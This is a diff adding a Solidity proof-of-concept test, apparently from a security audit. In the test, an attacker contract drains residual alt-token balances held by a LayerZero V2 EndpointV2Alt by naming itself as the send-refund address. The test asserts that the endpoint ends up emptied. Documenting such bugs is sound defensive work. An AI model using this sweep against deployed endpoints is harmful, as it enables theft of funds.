@@ -2,6 +2,7 @@
 pragma solidity ^0.8.24;
 
 import { EndpointV2 } from "../external/lz-evm-protocol-v2/contracts/EndpointV2.sol";
+import { EndpointV2Alt } from "../external/lz-evm-protocol-v2/contracts/EndpointV2Alt.sol";
 import { MessagingParams } from "../external/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
 import { SimpleMessageLib } from "../external/lz-evm-protocol-v2/contracts/messagelib/SimpleMessageLib.sol";
 import {
@@ -97,5 +98,39 @@ contract LayerZeroV2FullSourceParityTest {
         _assertTrue(lzToken.balanceOf(address(msgLib)) == 99, "expected lzToken fee transfer");
         _assertTrue(lzToken.balanceOf(address(attacker)) == residual - 99, "expected residual sweep refund");
         _assertTrue(lzToken.balanceOf(address(endpoint)) == 0, "expected endpoint drained");
+    }
+
+    /// @notice H4 full-source witness:
+    /// if EndpointV2Alt holds residual native-alt ERC20 balance, arbitrary caller can route it to self via send refund.
+    function test_h4_full_source_endpoint_alt_native_residual_sweep() public {
+        MockLzToken altToken = new MockLzToken();
+        EndpointV2Alt endpoint = new EndpointV2Alt(606, address(this), address(altToken));
+        SimpleMessageLib msgLib = new SimpleMessageLib(address(endpoint), address(this));
+        endpoint.registerLibrary(address(msgLib));
+        endpoint.setDefaultSendLibrary(707, address(msgLib));
+        endpoint.setDefaultReceiveLibrary(707, address(msgLib), 0);
+
+        // Force fee payment to use "native" alt ERC20 path.
+        msgLib.setMessagingFee(77, 0);
+
+        uint256 residual = 1_000;
+        altToken.mint(address(this), residual);
+        altToken.transfer(address(endpoint), residual);
+
+        EndpointSendActor attacker = new EndpointSendActor();
+        MessagingParams memory params = MessagingParams({
+            dstEid: 707,
+            receiver: bytes32(uint256(2)),
+            message: hex"beef",
+            options: "",
+            payInLzToken: false
+        });
+
+        attacker.callSend(endpoint, params, payable(address(attacker)));
+
+        // 77 consumed as fee to msgLib, remaining residual refunded to attacker-selected address.
+        _assertTrue(altToken.balanceOf(address(msgLib)) == 77, "expected alt native fee transfer");
+        _assertTrue(altToken.balanceOf(address(attacker)) == residual - 77, "expected residual sweep refund");
+        _assertTrue(altToken.balanceOf(address(endpoint)) == 0, "expected endpoint drained");
     }
 }
